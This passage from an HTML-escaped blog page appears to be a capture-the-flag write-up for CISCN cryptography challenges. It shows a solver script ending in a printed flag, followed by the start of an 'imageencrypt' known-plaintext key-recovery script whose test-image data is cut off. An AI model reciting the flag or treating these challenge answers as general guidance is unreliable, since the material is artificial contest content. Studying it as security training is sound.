&lt;span class=&#34;n&#34;&gt;y&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;k&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;y&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;right&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;k&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;515&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;mid&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;left&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;right&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;v&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;^&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;^&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;round&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;^&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.25&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;^&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;left&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mid&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;       &lt;span class=&#34;n&#34;&gt;right&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mid&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;right&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;inverse_mod&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;n&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Ec&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;EllipticCurve&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Zmod&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Point&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Ec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;y&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Point&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;long_to_bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;long_to_bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# CISCN{e91fef4ead7463b13d00bda65f540477}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;imageencrypt&#34;&gt;imageencrypt&lt;/h3&gt;
&lt;p&gt;题目给了一组对应的明文密文，然后给了一个更长的密文，所以需要先使用明文密文解出所有的需要的参数，然后用这些参数对这个更长对密文进行解密，得到flag。&lt;/p&gt;
&lt;p&gt;密钥流bins的作用是4选1，不妨全部选择0，得到四个值中一定有两个是key1和key2.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;generate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;round&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;get_nums&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;out&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;testimage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;^&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;testimage_enc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xff&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;testimage&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;205&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;237&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;158&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;24&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;119&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;213&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;74&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;151&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;142&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;186&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;57&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;28&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;113&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;62&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;165&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;190&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;37&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;159&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;137&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;196&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;44&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;97&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;37&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;222&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;220&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;95&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;66&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;28&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;199&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;142&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;95&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;105&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;119&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;232&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;250&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;215&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;60&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;162&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;91&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;211&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;63&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;30&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;91&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;108&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;217&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;206&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;80&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;193&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;230&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;42&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;221&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;71&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;136&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;115&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;22&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;176&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;91&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;57&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;61&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;87&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;73&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;250&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;121&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;51&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;72&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;83&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;120&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;77&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;199&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;236&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;190&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;249&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;116&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;45&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;134&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;110&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;149&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;94&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;214&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;232&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;153&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;213&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;119&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;98&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;81&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;203&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;240&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;114&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;240&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;29&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;122&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;188&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;156&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;53&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;128&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;185&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;40&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;147&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;245&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;204&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;47&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;101&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;80&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;229&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;41&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;150&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;28&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;195&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;25&lt;/span&gt;&lt;span 